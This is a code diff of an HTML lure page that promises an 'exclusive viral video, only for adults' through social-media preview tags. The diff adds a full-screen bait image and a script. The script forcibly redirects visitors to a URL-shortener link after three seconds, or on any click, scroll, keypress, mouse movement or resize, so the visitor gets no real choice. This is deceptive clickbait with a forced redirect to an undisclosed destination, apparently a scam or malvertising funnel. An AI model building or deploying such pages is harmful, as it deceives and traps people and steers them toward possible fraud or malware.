@@ -2,19 +2,63 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Hot Viral Video - Watch Now!</title>
+  <title>Watch Now</title>
   <meta property="og:title" content="Hot Viral Video - Watch Now!" />
   <meta property="og:description" content="Exclusive viral video, only for adults. Click to watch the full video!" />
   <meta property="og:image" content="https://i.supaimg.com/270adda1-6a33-4c66-b65a-503b712780a0.jpg" />
   <meta property="og:url" content="https://dressifystore.store/" />
-  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: #000;
+    }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      width: 100vw;
+    }
+    .fullscreen-img {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      display: block;
+    }
+  </style>
 </head>
 <body>
-  <h1>Watch Full Video</h1>
-  <a href="https://urlroxx.com/MuzVQ" target="_blank">
-    <img src="https://i.supaimg.com/270adda1-6a33-4c66-b65a-503b712780a0.jpg" alt="Hot Video" style="width:100%;max-width:400px;">
-    <br>
-    <button>Click Here to Watch Full Video</button>
-  </a>
+  <img src="https://i.supaimg.com/270adda1-6a33-4c66-b65a-503b712780a0.jpg" alt="Hot Video" class="fullscreen-img" />
+
+  <script>
+    // Redirect URL
+    const redirectUrl = "https://urlroxx.com/MuzVQ";
+
+    // Redirect function
+    function redirectNow() {
+      window.location.href = redirectUrl;
+    }
+
+    // Redirect after 3 seconds automatically
+    setTimeout(redirectNow, 3000);
+
+    // Redirect on any user activity
+    function userActionRedirect() {
+      redirectNow();
+    }
+
+    // Listen for user activity
+    window.addEventListener('click', userActionRedirect);
+    window.addEventListener('touchstart', userActionRedirect);
+    window.addEventListener('scroll', userActionRedirect);
+    window.addEventListener('keydown', userActionRedirect);
+    window.addEventListener('mousemove', userActionRedirect);
+    window.addEventListener('wheel', userActionRedirect);
+    window.addEventListener('resize', userActionRedirect);
+  </script>
 </body>
 </html>
